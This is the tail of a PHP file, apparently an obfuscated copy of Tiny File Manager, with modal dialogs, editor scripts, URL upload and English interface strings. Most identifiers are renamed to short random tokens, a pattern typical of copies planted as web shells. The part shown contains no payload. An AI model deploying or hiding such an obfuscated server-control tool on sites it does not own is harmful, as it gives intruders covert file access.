                --bs-dark-rgb: 28, 36, 41 !important;
                --bs-bg-opacity: 1;
            }
            .table-dark { --bs-table-bg: 28, 36, 41 !important; }
            .btn-primary { --bs-btn-bg: #26566c; --bs-btn-border-color: #26566c; }
            body.theme-dark { background-image: linear-gradient(90deg, #1c2429, #263238); color: #CFD8DC; }
            .list-group .list-group-item { background: #343a40; }
            .theme-dark .navbar-nav i, .navbar-nav .dropdown-toggle, .break-word { color: #CFD8DC; }
            a, a:hover, a:visited, a:active, #main-table .filename a, i.fa.fa-folder-o, i.go-back { color: var(--bg-color); }
            ul#search-wrapper li:nth-child(odd) { background: #212a2f; }
            .theme-dark .btn-outline-primary { color: #b8e59c; border-color: #b8e59c; }
            .theme-dark .btn-outline-primary:hover, .theme-dark .btn-outline-primary:active { background-color: #2d4121;}
            .theme-dark input.form-control { background-color: #101518; color: #CFD8DC; }
            .theme-dark .dropzone { background: transparent; }
            .theme-dark .inline-actions > a > i { background: #79755e; }
            .theme-dark .text-white { color: #CFD8DC !important; }
            .theme-dark .table-bordered td, .table-bordered th { border-color: #343434; }
            .theme-dark .table-bordered td .custom-control-input, .theme-dark .table-bordered th .custom-control-input { opacity: 0.678; }
            .message { background-color: #212529; }
            .compact-table tr:hover td { background-color: #3d3d3d; }
            #main-table tr.even { background-color: #21292f; }
            form.dropzone { border-color: #79755e; }
        </style>
    <?php endif;?>
</head>
<body class="<?php echo(FM_THEME=="dark")?'theme-dark':'';?> <?php echo $m15e;?>">
<div id="wrapper" class="container-fluid">
    <!-- New Item creation -->
    <div class="modal fade" id="createNewItem" tabindex="-1" role="dialog" data-bs-backdrop="static" data-bs-keyboard="false" aria-labelledby="newItemModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <form class="modal-content <?php echo p2d();?>" method="post">
                <div class="modal-header">
                    <h5 class="modal-title" id="newItemModalLabel"><i class="fa fa-plus-square fa-fw"></i><?php echo c3a('CreateNewItem')?></h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <p><label for="newfile"><?php echo c3a('ItemType')?> </label></p>
                    <div class="form-check form-check-inline">
                      <input class="form-check-input" type="radio" name="newfile" id="customRadioInline1" name="newfile" value="file">
                      <label class="form-check-label" for="customRadioInline1"><?php echo c3a('File')?></label>
                    </div>
                    <div class="form-check form-check-inline">
                      <input class="form-check-input" type="radio" name="newfile" id="customRadioInline2" value="folder" checked>
                      <label class="form-check-label" for="customRadioInline2"><?php echo c3a('Folder')?></label>
                    </div>

                    <p class="mt-3"><label for="newfilename"><?php echo c3a('ItemName')?> </label></p>
                    <input type="text" name="newfilename" id="newfilename" value="" class="form-control" placeholder="<?php echo c3a('Enter here...')?>" required>
                </div>
                <div class="modal-footer">
                    <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                    <button type="button" class="btn btn-outline-primary" data-bs-dismiss="modal"><i class="fa fa-times-circle"></i> <?php echo c3a('Cancel')?></button>
                    <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo c3a('CreateNow')?></button>
                </div>
            </form>
        </div>
    </div>

    <!-- Advance Search Modal -->
    <div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
      <div class="modal-dialog modal-lg" role="document">
        <div class="modal-content <?php echo p2d();?>">
          <div class="modal-header">
            <h5 class="modal-title col-10" id="searchModalLabel">
                <div class="input-group mb-3">
                  <input type="text" class="form-control" placeholder="<?php echo c3a('Search')?> <?php echo c3a('a files')?>" aria-label="<?php echo c3a('Search')?>" aria-describedby="search-addon3" id="advanced-search" autofocus required>
                  <span class="input-group-text" id="search-addon3"><i class="fa fa-search"></i></span>
                </div>
            </h5>
            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
          </div>
          <div class="modal-body">
            <form action="" method="post">
                <div class="lds-facebook"><div></div><div></div><div></div></div>
                <ul id="search-wrapper">
                    <p class="m-2"><?php echo c3a('Search file in folder and subfolders...')?></p>
                </ul>
            </form>
          </div>
        </div>
      </div>
    </div>

    <!--Rename Modal -->
    <div class="modal modal-alert" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="renameDailog">
      <div class="modal-dialog" role="document">
        <form class="modal-content rounded-3 shadow <?php echo p2d();?>" method="post" autocomplete="off">
          <div class="modal-body p-4 text-center">
            <h5 class="mb-3"><?php echo c3a('Are you sure want to rename?')?></h5>
            <p class="mb-1">
                <input type="text" name="rename_to" id="js-rename-to" class="form-control" placeholder="<?php echo c3a('Enter new file name')?>" required>
                <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                <input type="hidden" name="rename_from" id="js-rename-from">
            </p>
          </div>
          <div class="modal-footer flex-nowrap p-0">
            <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php echo c3a('Cancel')?></button>
            <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0"><strong><?php echo c3a('Okay')?></strong></button>
          </div>
        </form>
      </div>
    </div>

    <!-- Confirm Modal -->
    <script type="text/html" id="js-tpl-confirm">
        <div class="modal modal-alert confirmDailog" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="confirmDailog-<%this.id%>">
          <div class="modal-dialog" role="document">
            <form class="modal-content rounded-3 shadow <?php echo p2d();?>" method="post" autocomplete="off" action="<%this.action%>">
              <div class="modal-body p-4 text-center">
                <h5 class="mb-2"><?php echo c3a('Are you sure want to')?> <%this.title%> ?</h5>
                <p class="mb-1"><%this.content%></p>
              </div>
              <div class="modal-footer flex-nowrap p-0">
                <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php echo c3a('Cancel')?></button>
                <input type="hidden" name="token" value="<?php echo $_SESSION['token'];?>">
                <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0" data-bs-dismiss="modal"><strong><?php echo c3a('Okay')?></strong></button>
              </div>
            </form>
          </div>
        </div>
    </script>

    <?php }/**
     * Show page footer after login
     */ function d39(){?>
</div>
<?php m7('js-jquery');?>
<?php m7('js-bootstrap');?>
<?php m7('js-jquery-datatables');?>
<?php if(FM_USE_HIGHLIGHTJS&&isset($_GET['view'])):?>
    <?php m7('js-highlightjs');?>
    <script>hljs.highlightAll(); var isHighlightingEnabled = true;</script>
<?php endif;?>
<script>
    function template(html,options){
        var re=/<\%([^\%>]+)?\%>/g,reExp=/(^( )?(if|for|else|switch|case|break|{|}))(.*)?/g,code='var r=[];\n',cursor=0,match;var add=function(line,js){js?(code+=line.match(reExp)?line+'\n':'r.push('+line+');\n'):(code+=line!=''?'r.push("'+line.replace(/"/g,'\\"')+'");\n':'');return add}
        while(match=re.exec(html)){add(html.slice(cursor,match.index))(match[1],!0);cursor=match.index+match[0].length}
        add(html.substr(cursor,html.length-cursor));code+='return r.join("");';return new Function(code.replace(/[\r\t\n]/g,'')).apply(options)
    }
    function rename(e, t) { if(t) { $("#js-rename-from").val(t);$("#js-rename-to").val(t); $("#renameDailog").modal('show'); } }
    function change_checkboxes(e, t) { for (var n = e.length - 1; n >= 0; n--) e[n].checked = "boolean" == typeof t ? t : !e[n].checked }
    function get_checkboxes() { for (var e = document.getElementsByName("file[]"), t = [], n = e.length - 1; n >= 0; n--) (e[n].type = "checkbox") && t.push(e[n]); return t }
    function select_all() { change_checkboxes(get_checkboxes(), !0) }
    function unselect_all() { change_checkboxes(get_checkboxes(), !1) }
    function invert_all() { change_checkboxes(get_checkboxes()) }
    function checkbox_toggle() { var e = get_checkboxes(); e.push(this), change_checkboxes(e) }
    function backup(e, t) { // Create file backup with .bck
        var n = new XMLHttpRequest,
            a = "path=" + e + "&file=" + t + "&token="+ window.csrf +"&type=backup&ajax=true";
        return n.open("POST", "", !0), n.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), n.onreadystatechange = function () {
            4 == n.readyState && 200 == n.status && toast(n.responseText)
        }, n.send(a), !1
    }
    // Toast message
    function toast(txt) { var x = document.getElementById("snackbar");x.innerHTML=txt;x.className = "show";setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000); }
    // Save file
    function edit_save(e, t) {
        var n = "ace" == t ? editor.getSession().getValue() : document.getElementById("normal-editor").value;
        if (typeof n !== 'undefined' && n !== null) {
            if (true) {
                var data = {ajax: true, content: n, type: 'save', token: window.csrf};

                $.ajax({
                    type: "POST",
                    url: window.location,
                    data: JSON.stringify(data),
                    contentType: "application/json; charset=utf-8",
                    success: function(mes){toast("Saved Successfully"); window.onbeforeunload = function() {return}},
                    failure: function(mes) {toast("Error: try again");},
                    error: function(mes) {toast(`<p style="background-color:red">${mes.responseText}</p>`);}
                });
            } else {
                var a = document.createElement("form");
                a.setAttribute("method", "POST"), a.setAttribute("action", "");
                var o = document.createElement("textarea");
                o.setAttribute("type", "textarea"), o.setAttribute("name", "savedata");
                let cx = document.createElement("input"); cx.setAttribute("type", "hidden");cx.setAttribute("name", "token");cx.setAttribute("value", window.csrf);
                var c = document.createTextNode(n);
                o.appendChild(c), a.appendChild(o), a.appendChild(cx), document.body.appendChild(a), a.submit()
            }
        }
    }
    function show_new_pwd() { $(".js-new-pwd").toggleClass('hidden'); }
    // Save Settings
    function save_settings($this) {
        let form = $($this);
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            success: function (data) {if(data) { window.location.reload();}}
        }); return false;
    }
    //Create new password hash
    function new_password_hash($this) {
        let form = $($this), $pwd = $("#js-pwd-result"); $pwd.val('');
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            success: function (data) { if(data) { $pwd.val(data); } }
        }); return false;
    }
    // Upload files using URL @param {Object}
    function upload_from_url($this) {
        let form = $($this), resultWrapper = $("div#js-url-upload__list");
        $.ajax({
            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
            beforeSend: function() { form.find("input[name=uploadurl]").attr("disabled","disabled"); form.find("button").hide(); form.find(".lds-facebook").addClass('show-me'); },
            success: function (data) {
                if(data) {
                    data = JSON.parse(data);
                    if(data.done) {
                        resultWrapper.append('<div class="alert alert-success row">Uploaded Successful: '+data.done.name+'</div>'); form.find("input[name=uploadurl]").val('');
                    } else if(data['fail']) { resultWrapper.append('<div class="alert alert-danger row">Error: '+data.fail.message+'</div>'); }
                    form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');
                }
            },
            error: function(xhr) {
                form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');console.error(xhr);
            }
        }); return false;
    }
    // Search template
    function search_template(data) {
        var response = "";
        $.each(data, function (key, val) {
            response += `<li><a href="?p=${val.path}&view=${val.name}">${val.path}/${val.name}</a></li>`;
        });
        return response;
    }
    // Advance search
    function fm_search() {
        var searchTxt = $("input#advanced-search").val(), searchWrapper = $("ul#search-wrapper"), path = $("#js-search-modal").attr("href"), _html = "", $loader = $("div.lds-facebook");
        if(!!searchTxt && searchTxt.length > 2 && path) {
            var data = {ajax: true, content: searchTxt, path:path, type: 'search', token: window.csrf };
            $.ajax({
                type: "POST",
                url: window.location,
                data: data,
                beforeSend: function() {
                    searchWrapper.html('');
                    $loader.addClass('show-me');
                },
                success: function(data){
                    $loader.removeClass('show-me');
                    data = JSON.parse(data);
                    if(data && data.length) {
                        _html = search_template(data);
                        searchWrapper.html(_html);
                    } else { searchWrapper.html('<p class="m-2">No result found!<p>'); }
                },
                error: function(xhr) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>'); },
                failure: function(mes) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>');}
            });
        } else { searchWrapper.html("OOPS: minimum 3 characters required!"); }
    }

    // action confirm dailog modal
    function confirmDailog(e, id = 0, title = "Action", content = "", action = null) {
        e.preventDefault();
        const tplObj = {id, title, content: decodeURIComponent(content.replace(/\+/g, ' ')), action};
        let tpl = $("#js-tpl-confirm").html();
        $(".modal.confirmDailog").remove();
        $('#wrapper').append(template(tpl,tplObj));
        const $confirmDailog = $("#confirmDailog-"+tplObj.id);
        $confirmDailog.modal('show');
        return false;
    }
    

    // on mouse hover image preview
    !function(s){s.previewImage=function(e){var o=s(document),t=".previewImage",a=s.extend({xOffset:20,yOffset:-20,fadeIn:"fast",css:{padding:"5px",border:"1px solid #cccccc","background-color":"#fff"},eventSelector:"[data-preview-image]",dataKey:"previewImage",overlayId:"preview-image-plugin-overlay"},e);return o.off(t),o.on("mouseover"+t,a.eventSelector,function(e){s("p#"+a.overlayId).remove();var o=s("<p>").attr("id",a.overlayId).css("position","absolute").css("display","none").append(s('<img class="c-preview-img">').attr("src",s(this).data(a.dataKey)));a.css&&o.css(a.css),s("body").append(o),o.css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px").fadeIn(a.fadeIn)}),o.on("mouseout"+t,a.eventSelector,function(){s("#"+a.overlayId).remove()}),o.on("mousemove"+t,a.eventSelector,function(e){s("#"+a.overlayId).css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px")}),this},s.previewImage()}(jQuery);

    // Dom Ready Events
    $(document).ready( function () {
        // dataTable init
        var $table = $('#main-table'),
            tableLng = $table.find('th').length,
            _targets = (tableLng && tableLng == 7 ) ? [0, 4,5,6] : tableLng == 5 ? [0,4] : [3];
            mainTable = $('#main-table').DataTable({paging: false, info: false, order: [], columnDefs: [{targets: _targets, orderable: false}]
        });
        // filter table
        $('#search-addon').on( 'keyup', function () {
            mainTable.search( this.value ).draw();
        });
        $("input#advanced-search").on('keyup', function (e) {
            if (e.keyCode === 13) { fm_search(); }
        });
        $('#search-addon3').on( 'click', function () { fm_search(); });
        //upload nav tabs
        $(".fm-upload-wrapper .card-header-tabs").on("click", 'a', function(e){
            e.preventDefault();let target=$(this).data('target');
            $(".fm-upload-wrapper .card-header-tabs a").removeClass('active');$(this).addClass('active');
            $(".fm-upload-wrapper .card-tabs-container").addClass('hidden');$(target).removeClass('hidden');
        });
    });
</script>
<?php if(isset($_GET['edit'])&&isset($_GET['env'])&&FM_EDIT_FILE&&!FM_READONLY):$a92=pathinfo($_GET["edit"],PATHINFO_EXTENSION);$a92=$a92=="js"?"javascript":$a92;?>
    <?php m7('js-ace');?>
    <script>
        var editor = ace.edit("editor");
        editor.getSession().setMode( {path:"ace/mode/<?php echo $a92;?>", inline:true} );
        //editor.setTheme("ace/theme/twilight"); //Dark Theme
        editor.setShowPrintMargin(false); // Hide the vertical ruler
        function ace_commend (cmd) { editor.commands.exec(cmd, editor); }
        editor.commands.addCommands([{
            name: 'save', bindKey: {win: 'Ctrl-S',  mac: 'Command-S'},
            exec: function(editor) { edit_save(this, 'ace'); }
        }]);
        function renderThemeMode() {
            var $modeEl = $("select#js-ace-mode"), $themeEl = $("select#js-ace-theme"), $fontSizeEl = $("select#js-ace-fontSize"), optionNode = function(type, arr){ var $Option = ""; $.each(arr, function(i, val) { $Option += "<option value='"+type+i+"'>" + val + "</option>"; }); return $Option; },
                _data = {"aceTheme":{"bright":{"chrome":"Chrome","clouds":"Clouds","crimson_editor":"Crimson Editor","dawn":"Dawn","dreamweaver":"Dreamweaver","eclipse":"Eclipse","github":"GitHub","iplastic":"IPlastic","solarized_light":"Solarized Light","textmate":"TextMate","tomorrow":"Tomorrow","xcode":"XCode","kuroir":"Kuroir","katzenmilch":"KatzenMilch","sqlserver":"SQL Server"},"dark":{"ambiance":"Ambiance","chaos":"Chaos","clouds_midnight":"Clouds Midnight","dracula":"Dracula","cobalt":"Cobalt","gruvbox":"Gruvbox","gob":"Green on Black","idle_fingers":"idle Fingers","kr_theme":"krTheme","merbivore":"Merbivore","merbivore_soft":"Merbivore Soft","mono_industrial":"Mono Industrial","monokai":"Monokai","pastel_on_dark":"Pastel on dark","solarized_dark":"Solarized Dark","terminal":"Terminal","tomorrow_night":"Tomorrow Night","tomorrow_night_blue":"Tomorrow Night Blue","tomorrow_night_bright":"Tomorrow Night Bright","tomorrow_night_eighties":"Tomorrow Night 80s","twilight":"Twilight","vibrant_ink":"Vibrant Ink"}},"aceMode":{"javascript":"JavaScript","abap":"ABAP","abc":"ABC","actionscript":"ActionScript","ada":"ADA","apache_conf":"Apache Conf","asciidoc":"AsciiDoc","asl":"ASL","assembly_x86":"Assembly x86","autohotkey":"AutoHotKey","apex":"Apex","batchfile":"BatchFile","bro":"Bro","c_cpp":"C and C++","c9search":"C9Search","cirru":"Cirru","clojure":"Clojure","cobol":"Cobol","coffee":"CoffeeScript","coldfusion":"ColdFusion","csharp":"C#","csound_document":"Csound Document","csound_orchestra":"Csound","csound_score":"Csound Score","css":"CSS","curly":"Curly","d":"D","dart":"Dart","diff":"Diff","dockerfile":"Dockerfile","dot":"Dot","drools":"Drools","edifact":"Edifact","eiffel":"Eiffel","ejs":"EJS","elixir":"Elixir","elm":"Elm","erlang":"Erlang","forth":"Forth","fortran":"Fortran","fsharp":"FSharp","fsl":"FSL","ftl":"FreeMarker","gcode":"Gcode","gherkin":"Gherkin","gitignore":"Gitignore","glsl":"Glsl","gobstones":"Gobstones","golang":"Go","graphqlschema":"GraphQLSchema","groovy":"Groovy","haml":"HAML","handlebars":"Handlebars","haskell":"Haskell","haskell_cabal":"Haskell Cabal","haxe":"haXe","hjson":"Hjson","html":"HTML","html_elixir":"HTML (Elixir)","html_ruby":"HTML (Ruby)","ini":"INI","io":"Io","jack":"Jack","jade":"Jade","java":"Java","json":"JSON","jsoniq":"JSONiq","jsp":"JSP","jssm":"JSSM","jsx":"JSX","julia":"Julia","kotlin":"Kotlin","latex":"LaTeX","less":"LESS","liquid":"Liquid","lisp":"Lisp","livescript":"LiveScript","logiql":"LogiQL","lsl":"LSL","lua":"Lua","luapage":"LuaPage","lucene":"Lucene","makefile":"Makefile","markdown":"Markdown","mask":"Mask","matlab":"MATLAB","maze":"Maze","mel":"MEL","mixal":"MIXAL","mushcode":"MUSHCode","mysql":"MySQL","nix":"Nix","nsis":"NSIS","objectivec":"Objective-C","ocaml":"OCaml","pascal":"Pascal","perl":"Perl","perl6":"Perl 6","pgsql":"pgSQL","php_laravel_blade":"PHP (Blade Template)","php":"PHP","puppet":"Puppet","pig":"Pig","powershell":"Powershell","praat":"Praat","prolog":"Prolog","properties":"Properties","protobuf":"Protobuf","python":"Python","r":"R","razor":"Razor","rdoc":"RDoc","red":"Red","rhtml":"RHTML","rst":"RST","ruby":"Ruby","rust":"Rust","sass":"SASS","scad":"SCAD","scala":"Scala","scheme":"Scheme","scss":"SCSS","sh":"SH","sjs":"SJS","slim":"Slim","smarty":"Smarty","snippets":"snippets","soy_template":"Soy Template","space":"Space","sql":"SQL","sqlserver":"SQLServer","stylus":"Stylus","svg":"SVG","swift":"Swift","tcl":"Tcl","terraform":"Terraform","tex":"Tex","text":"Text","textile":"Textile","toml":"Toml","tsx":"TSX","twig":"Twig","typescript":"Typescript","vala":"Vala","vbscript":"VBScript","velocity":"Velocity","verilog":"Verilog","vhdl":"VHDL","visualforce":"Visualforce","wollok":"Wollok","xml":"XML","xquery":"XQuery","yaml":"YAML","django":"Django"},"fontSize":{8:8,10:10,11:11,12:12,13:13,14:14,15:15,16:16,17:17,18:18,20:20,22:22,24:24,26:26,30:30}};
            if(_data && _data.aceMode) { $modeEl.html(optionNode("ace/mode/", _data.aceMode)); }
            if(_data && _data.aceTheme) { var lightTheme = optionNode("ace/theme/", _data.aceTheme.bright), darkTheme = optionNode("ace/theme/", _data.aceTheme.dark); $themeEl.html("<optgroup label=\"Bright\">"+lightTheme+"</optgroup><optgroup label=\"Dark\">"+darkTheme+"</optgroup>");}
            if(_data && _data.fontSize) { $fontSizeEl.html(optionNode("", _data.fontSize)); }
            $modeEl.val( editor.getSession().$modeId );
            $themeEl.val( editor.getTheme() );
            $fontSizeEl.val(12).change(); //set default font size in drop down
        }

        $(function(){
            renderThemeMode();
            $(".js-ace-toolbar").on("click", 'button', function(e){
                e.preventDefault();
                let cmdValue = $(this).attr("data-cmd"), editorOption = $(this).attr("data-option");
                if(cmdValue && cmdValue != "none") {
                    ace_commend(cmdValue);
                } else if(editorOption) {
                    if(editorOption == "fullscreen") {
                        (void 0!==document.fullScreenElement&&null===document.fullScreenElement||void 0!==document.msFullscreenElement&&null===document.msFullscreenElement||void 0!==document.mozFullScreen&&!document.mozFullScreen||void 0!==document.webkitIsFullScreen&&!document.webkitIsFullScreen)
                        &&(editor.container.requestFullScreen?editor.container.requestFullScreen():editor.container.mozRequestFullScreen?editor.container.mozRequestFullScreen():editor.container.webkitRequestFullScreen?editor.container.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT):editor.container.msRequestFullscreen&&editor.container.msRequestFullscreen());
                    } else if(editorOption == "wrap") {
                        let wrapStatus = (editor.getSession().getUseWrapMode()) ? false : true;
                        editor.getSession().setUseWrapMode(wrapStatus);
                    }
                }
            });
            $("select#js-ace-mode, select#js-ace-theme, select#js-ace-fontSize").on("change", function(e){
                e.preventDefault();
                let selectedValue = $(this).val(), selectionType = $(this).attr("data-type");
                if(selectedValue && selectionType == "mode") {
                    editor.getSession().setMode(selectedValue);
                } else if(selectedValue && selectionType == "theme") {
                    editor.setTheme(selectedValue);
                }else if(selectedValue && selectionType == "fontSize") {
                    editor.setFontSize(parseInt(selectedValue));
                }
            });
        });
    </script>
<?php endif;?>
<div id="snackbar"></div>
</body>
</html>
<?php }/**
 * Language Translation System
 * @param string $txt
 * @return string
 */ function c3a($l168){global $b5b;$o117['en']['AppName']='Tiny File Manager';$o117['en']['AppTitle']='File Manager';$o117['en']['Login']='Sign in';$o117['en']['Username']='Username';$o117['en']['Password']='Password';$o117['en']['Logout']='Sign Out';$o117['en']['Move']='Move';$o117['en']['Copy']='Copy';$o117['en']['Save']='Save';$o117['en']['SelectAll']='Select all';$o117['en']['UnSelectAll']='Unselect all';$o117['en']['File']='File';$o117['en']['Back']='Back';$o117['en']['Size']='Size';$o117['en']['Perms']='Perms';$o117['en']['Modified']='Modified';$o117['en']['Owner']='Owner';$o117['en']['Search']='Search';$o117['en']['NewItem']='New Item';$o117['en']['Folder']='Folder';$o117['en']['Delete']='Delete';$o117['en']['Rename']='Rename';$o117['en']['CopyTo']='Copy to';$o117['en']['DirectLink']='Direct link';$o117['en']['UploadingFiles']='Upload Files';$o117['en']['ChangePermissions']='Change Permissions';$o117['en']['Copying']='Copying';$o117['en']['CreateNewItem']='Create New Item';$o117['en']['Name']='Name';$o117['en']['AdvancedEditor']='Advanced Editor';$o117['en']['Actions']='Actions';$o117['en']['Folder is empty']='Folder is empty';$o117['en']['Upload']='Upload';$o117['en']['Cancel']='Cancel';$o117['en']['InvertSelection']='Invert Selection';$o117['en']['DestinationFolder']='Destination Folder';$o117['en']['ItemType']='Item Type';$o117['en']['ItemName']='Item Name';$o117['en']['CreateNow']='Create Now';$o117['en']['Download']='Download';$o117['en']['Open']='Open';$o117['en']['UnZip']='UnZip';$o117['en']['UnZipToFolder']='UnZip to folder';$o117['en']['Edit']='Edit';$o117['en']['NormalEditor']='Normal Editor';$o117['en']['BackUp']='Back Up';$o117['en']['SourceFolder']='Source Folder';$o117['en']['Files']='Files';$o117['en']['Move']='Move';$o117['en']['Change']='Change';$o117['en']['Settings']='Settings';$o117['en']['Language']='Language';$o117['en']['ErrorReporting']='Error Reporting';$o117['en']['ShowHiddenFiles']='Show Hidden Files';$o117['en']['Help']='Help';$o117['en']['Created']='Created';$o117['en']['Help Documents']='Help Documents';$o117['en']['Report Issue']='Report Issue';$o117['en']['Generate']='Generate';$o117['en']['FullSize']='Full Size';$o117['en']['HideColumns']='Hide Perms/Owner columns';$o117['en']['You are logged in']='You are logged in';$o117['en']['Nothing selected']='Nothing selected';$o117['en']['Paths must be not equal']='Paths must be not equal';$o117['en']['Renamed from']='Renamed from';$o117['en']['Archive not unpacked']='Archive not unpacked';$o117['en']['Deleted']='Deleted';$o117['en']['Archive not created']='Archive not created';$o117['en']['Copied from']='Copied from';$o117['en']['Permissions changed']='Permissions changed';$o117['en']['to']='to';$o117['en']['Saved Successfully']='Saved Successfully';$o117['en']['not found!']='not found!';$o117['en']['File Saved Successfully']='File Saved Successfully';$o117['en']['Archive']='Archive';$o117['en']['Permissions not changed']='Permissions not changed';$o117['en']['Select folder']='Select folder';$o117['en']['Source path not defined']='Source path not defined';$o117['en']['already exists']='already exists';$o117['en']['Error while moving from']='Error while moving from';$o117['en']['Create archive?']='Create archive?';$o117['en']['Invalid file or folder name']='Invalid file or folder name';$o117['en']['Archive unpacked']='Archive unpacked';$o117['en']['File extension is not allowed']='File extension is not allowed';$o117['en']['Root path']='Root path';$o117['en']['Error while renaming from']='Error while renaming from';$o117['en']['File not found']='File not found';$o117['en']['Error while deleting items']='Error while deleting items';$o117['en']['Moved from']='Moved from';$o117['en']['Generate new password hash']='Generate new password hash';$o117['en']['Login failed. Invalid username or password']='Login failed. Invalid username or password';$o117['en']['password_hash not supported, Upgrade PHP version']='password_hash not supported, Upgrade PHP version';$o117['en']['Advanced Search']='Advanced Search';$o117['en']['Error while copying from']='Error while copying from';$o117['en']['Invalid characters in file name']='Invalid characters in file name';$o117['en']['FILE EXTENSION HAS NOT SUPPORTED']='FILE EXTENSION HAS NOT SUPPORTED';$o117['en']['Selected files and folder deleted']='Selected files and folder deleted';$o117['en']['Error while fetching archive info']='Error while fetching archive info';$o117['en']['Delete selected files and folders?']='Delete selected files and folders?';$o117['en']['Search file in folder and subfolders...']='Search file in folder and subfolders...';$o117['en']['Access denied. IP restriction applicable']='Access denied. IP restriction applicable';$o117['en']['Invalid characters in file or folder name']='Invalid characters in file or folder name';$o117['en']['Operations with archives are not available']='Operations with archives are not available';$o117['en']['File or folder with this path already exists']='File or folder with this path already exists';$q169=y17($o117);$o117=$q169?$q169:$o117;if(!strlen($b5b))$b5b='en';if(isset($o117[$b5b][$l168]))return g1c($o117[$b5b][$l168]);else if(isset($o117['en'][$l168]))return g1c($o117['en'][$l168]);else return"$l168";}?>
